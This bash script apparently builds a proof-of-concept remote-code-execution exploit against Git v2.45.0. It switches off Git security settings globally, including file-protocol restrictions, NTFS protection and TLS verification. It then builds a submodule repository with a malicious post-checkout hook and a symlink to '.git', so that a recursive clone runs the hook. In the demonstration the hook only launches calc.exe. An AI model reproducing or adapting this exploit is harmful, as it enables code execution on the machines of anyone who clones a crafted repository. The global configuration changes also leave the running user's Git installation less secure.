#!/bin/bash
set +x
echo Git RCE Constructor v1.6 \(Local Mode\)
echo -e "\033]0;Git RCE Constructor v1.6 (Local Mode)\007"
echo Notice: You must use Git v2.45.0 for this exploit to work!
set -x
git config --global protocol.file.allow always
git config --global core.protectNTFS false
git config --global http.sslVerify false
git config --global core.symlinks true
if [ -z "$(git config --global user.name)" ]; then
git config --global user.name "$USERNAME"
fi
if [ -z "$(git config --global user.email)" ]; then
git config --global user.email "$USERNAME"
fi
echo Constructing hook repo...
mkdir -p git_rce_hook
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_hook disable
fi
git init git_rce_hook
cd git_rce_hook
git config receive.denyCurrentBranch updateInstead
git config receive.denyNonFastForwards false
git config receive.denyDeletes false
mkdir -p scripts/hooks
cat > scripts/hooks/post-checkout <<EOF
#!/bin/bash
set -x
cd ../../..
export GIT_DIR="\$PWD/.git"
export GIT_WORK_TREE="\$PWD"
echo 'git -C GITLNK/modules/RCE hook run post-checkout -- "\$(git rev-parse HEAD)" "\$(git rev-parse HEAD)" 1' >Call-Post-Checkout.sh
echo 'Call-Post-Checkout.sh' >>.git/info/exclude
echo 'It works!' >Test.txt
git add Test.txt
git commit -m "test"
CMD <<END
start explorer "C:\Windows\System32\calc.exe"
echo.It works!
END
sleep 1
unset GIT_DIR
unset GIT_WORK_TREE
exit 0
EOF
chmod +x scripts/hooks/post-checkout
git_editor=$(git config --get core.editor)
if [ -z "$git_editor" ]; then
git_editor="vim"
fi
"$git_editor" "$PWD/scripts/hooks/post-checkout"
git add scripts/hooks/post-checkout
git commit -m "add-post-checkout"
git stash
cd ..
hook_repo_path="$PWD/git_rce_hook"
echo Constructing main repo...
mkdir -p git_rce_main
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_main disable
fi
git init git_rce_main
cd git_rce_main
git config receive.denyCurrentBranch updateInstead
git config receive.denyNonFastForwards false
git config receive.denyDeletes false
git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE
git config -f .gitmodules submodule.RCE/scripts.ignore all
git add .gitmodules
git commit -m "add-submodule"
git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
git commit -m "add-symlink"
git stash
cd ..
main_repo_path="$PWD/git_rce_main"
echo Testing the exploit...
mkdir -p git_rce_test
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_test disable
fi
git clone --recursive "$main_repo_path" git_rce_test
set +x
echo All done!
echo -n "Press any key to continue . . ."
read -N 1
exit 0
